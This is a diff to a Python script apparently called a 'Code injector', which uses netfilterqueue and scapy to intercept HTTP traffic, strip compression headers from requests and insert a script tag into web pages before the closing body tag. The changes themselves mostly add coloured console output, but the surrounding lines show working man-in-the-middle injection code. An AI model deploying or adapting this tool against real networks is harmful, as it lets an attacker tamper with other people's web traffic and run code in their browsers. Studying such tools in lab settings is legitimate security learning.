@@ -1,4 +1,4 @@
-#!usr/bin/env python
+#!usr/bin/env python3
 
 #########################################################################
 # Author : Dhrumil Mistry
@@ -14,6 +14,7 @@ from subprocess import call
 import netfilterqueue
 import scapy.all as scapy
 from re import search, sub
+from colors import *
 
 ############################### Functions ############################### 
 def forward_packets():
@@ -63,12 +64,12 @@ def process_packet(packet):
         new_payload = b'unchanged payload'
 
         if scapy_pkt[scapy.TCP].dport == 80:
-            print('[*] Request Detected!')
+            print(BRIGHT_WHITE + '[*] Request Detected!')
             tampered_load = sub(b'Accept-Encoding:.*?\\r\\n',b'', load)
             
 
         elif scapy_pkt[scapy.TCP].sport == 80:
-            print('[*] Response Detected!')
+            print(BRIGHT_WHITE + '[*] Response Detected!')
             load = load.decode('utf-8', 'ignore')
             load = load.replace('</BODY>', '</body>')
             if '</body>' in load:
@@ -103,29 +104,30 @@ inj_code = '<script>alert("Payload Added!!")</script>'
 
 reset_config()
 
-print('[*] configuring packet receiver...')
+print(BRIGHT_YELLOW + '[*] Starting Code injector...')
+print(BRIGHT_YELLOW + '[*] configuring packet receiver...')
 
 forward_packets()
-print('[*] packet receiver configured successfully.\n')
+print(BRIGHT_YELLOW + '[*] packet receiver configured successfully.\n')
 
-print('[*] Creating Queue to start receiving packets.')
+print(BRIGHT_YELLOW + '[*] Creating Queue to start receiving packets.')
 try:
     queue = netfilterqueue.NetfilterQueue()
     queue.bind(0, process_packet)
     queue.run()
 
 except OSError as e:
-    print('[-] Run script with root priviliges.')
+    print(BRIGHT_RED + '[-] Run script with root priviliges.')
     print(e)
 
 except KeyboardInterrupt:
-    print('\r[-] Keyboard Interrupt detected!')
+    print(BRIGHT_RED + '\r[-] Keyboard Interrupt detected!')
 
 except Exception:
-    print('[-] An Exception occurred while creating queue.\n', Exception)
+    print(BRIGHT_RED + '[-] An Exception occurred while creating queue.\n', Exception)
 
 finally:
-    print('[*] Restoring previous configurations.. please be patient...')
+    print(BRIGHT_YELLOW + '[*] Restoring previous configurations.. please be patient...')
     reset_config()
 
-    print('[-] Program stopped.')
+    print(BRIGHT_RED + '[-] Program stopped.')
